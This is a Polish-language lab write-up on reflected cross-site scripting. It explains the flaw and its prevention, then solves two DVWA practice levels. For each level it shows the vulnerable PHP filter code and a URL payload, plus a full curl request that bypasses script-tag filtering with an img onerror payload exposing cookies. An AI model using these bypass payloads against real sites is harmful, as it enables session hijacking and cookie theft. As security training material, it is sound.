# Reflected XSS
## Opis techniki
<blockquote>
Reflected Cross-Site Scripting (XSS) to podatność, która pozwala atakującemu wstrzyknąć złośliwe skrypty do stron internetowych wyświetlanych przez innych użytkowników. Jest to osiągane poprzez dołączenie złośliwego skryptu jako części adresu URL, który jest przetwarzany przez serwer i wysyłany do przeglądarki użytkownika, która następnie wykonuje skrypt (jako część kodu strony).

Oto kilka kluczowych cech i zagrożeń związanych z Reflected XSS:
* Brak odpowiedniej walidacji danych wejściowych: W przypadku Reflected XSS, złośliwe skrypty są wstrzykiwane poprzez nieweryfikowane lub nieprawidłowo walidowane dane wejściowe od użytkownika. Jeżeli aplikacja nie waliduje odpowiednio tych danych, atakujący może wprowadzić złośliwe skrypty, które są następnie odbijane do użytkownika przez serwer.
* Zależność od interakcji użytkownika: Reflected XSS zwykle wymaga od użytkownika kliknięcia na złośliwy link lub wprowadzenia danych w niezaufanej stronie. To sprawia, że ataki są często celowane i mogą być wykorzystywane w celach phishingu czy kradzieży danych.
* Krótkotrwały charakter: W przeciwieństwie do Stored XSS, złośliwy skrypt w Reflected XSS nie jest przechowywany na serwerze. Zamiast tego, skrypt jest odbijany jednokrotnie do użytkownika. Oznacza to, że skutki ataku mogą być mniej trwałe, ale jednocześnie trudniejsze do wykrycia.
* Zagrożenie dla sekretów: Reflected XSS może prowadzić do kradzieży wrażliwych danych, takich jak ciasteczka sesji, co może umożliwić atakującemu przejęcie sesji użytkownika.
</blockquote>

## Zapobieganie
<blockquote>
W celu uniknięcia tego typu podatności, należy prawidłowo zastosować kodowanie danych wyjściowych lub użycie listy dozwolonych znaków. Można również wykorzystać mechanizmy zabezpieczające przeglądarki, takie jak Polityka Bezpieczeństwa Treści (Content Security Policy - CSP), które mogą ograniczyć możliwość wykonania złośliwych skryptów.
</blockquote>

## DVWA labs
- [DVWA Reflected XSS #2 - Medium](#dvwa-XSS-Reflected-1---medium)

- [DVWA Reflected XSS #3 - High](#dvwa-XSS-Reflected-2---high)

<br/>

## DVWA Reflected XSS #1 - Medium
Na średnim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Filtrowanie tagów <script>

#### Kod źródłowy strony `PHP`
```php
<?php
header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
?> 
```

#### Payload
Podatny endpoint: `http://10.10.236.56/vulnerabilities/xss_r` <br/>
URL: `http://10.10.236.56/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>'`

#### Komenda curl - [Wzór zapytania]
```bash
curl -i -s -k -X $'GET' -H $'Host: 10.10.236.56' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://10.10.236.56/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E' -H $'Upgrade-Insecure-Requests: 1' \ -b $'PHPSESSID=o8bg59jl012q96i1sjk4p9ieo0; security=medium' \ $'http://10.10.236.56/vulnerabilities/xss_r/?name=%3Cimg+src+onerror%3Dalert%28document.cookie%29%3E'
```
  
#### Efekt działania:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/XSS_Reflected_med.png "Po wykonaniu odpowiedniego zapytania następuje ujawnienie cookies użytkownika.")

Do obejścia zabezpieczenia wykorzystano tag `<img>` zamiast script. Po wykonaniu odpowiedniego zapytania następuje wykonanie kodu w przeglądarce użytkownika i ujawnienie cookies.
<br/>
<br/>

## DVWA Reflected XSS #2 - Hard
Na trudnym poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Dokładniejsze filtrowanie ciągu znaków "<script"
* Filtry są teraz case-insensitive

#### Kod źródłowy strony `PHP`
```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
?> 
```

#### Komenda curl - [Wzór zapytania]
```bash
curl -i -s -k -X $'GET' \ -H $'Host: 10.10.236.56' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://10.10.236.56/vulnerabilities/xss_r/' -H $'Upgrade-Insecure-Requests: 1' \ -b $'PHPSESSID=o8bg59jl012q96i1sjk4p9ieo0; security=high' \ $'http://10.10.236.56/vulnerabilities/xss_r/?name=%3Cimg+src+onerror%3Dalert%28document.cookie%29%3E'
```

#### Efekt działania:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/XSS_Reflected_high.png "Po wykonaniu odpowiedniego zapytania następuje ujawnienie cookies użytkownika.")
<br/>

Do obejścia zabezpieczenia wykorzystano tag `<img>` zamiast script. Po wykonaniu odpowiedniego zapytania następuje wykonanie kodu w przeglądarce użytkownika i ujawnienie cookies.
